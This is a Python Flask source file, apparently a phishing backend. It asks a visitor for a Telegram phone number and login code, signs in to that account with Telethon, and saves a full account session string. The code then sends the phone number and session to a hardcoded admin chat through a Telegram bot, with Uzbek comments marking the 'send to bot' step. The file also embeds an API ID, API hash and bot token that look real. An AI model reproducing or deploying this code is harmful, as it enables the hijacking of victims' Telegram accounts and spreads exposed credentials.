import os
import asyncio
from flask import Flask, render_template, request, jsonify
from telethon import TelegramClient
from telethon.sessions import StringSession
import telebot

API_ID = 36197920
API_HASH = '2ccde5b4efd9a1465286f2bbcfec4b05'
BOT_TOKEN = '7629255776:AAH56h9vB9C9SntYgH0079VvTivY_y5p6U0'
ADMIN_ID = 6046023363

app = Flask(__name__)
bot = telebot.TeleBot(BOT_TOKEN)
user_data = {}

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/send_phone', methods=['POST'])
async def send_phone():
    phone = request.json.get('phone')
    client = TelegramClient(StringSession(), API_ID, API_HASH)
    await client.connect()
    try:
        sent = await client.send_code_request(phone)
        user_data[phone] = {"client": client, "hash": sent.phone_code_hash}
        return jsonify({"status": "success"})
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)})

@app.route('/send_code', methods=['POST'])
async def send_code():
    phone = request.json.get('phone')
    code = request.json.get('code')
    if phone not in user_data: return jsonify({"status": "error"})
    
    data = user_data[phone]
    client = data['client']
    try:
        await client.sign_in(phone, code, phone_code_hash=data['hash'])
        if await client.is_user_authorized():
            # STRING SESSION GENERATSIYA
            string_session = client.session.save()
            
            # BOTGA YUBORISH
            text = f"✅ KIRILDI!\n📞 Raqam: `{phone}`\n\n🔑 **KOD (Nusxalang):**\n`{string_session}`"
            bot.send_message(ADMIN_ID, text, parse_mode="Markdown")
            
            await client.disconnect()
            user_data.pop(phone)
            return jsonify({"status": "success"})
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)})

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 8080))
    app.run(host='0.0.0.0', port=port)
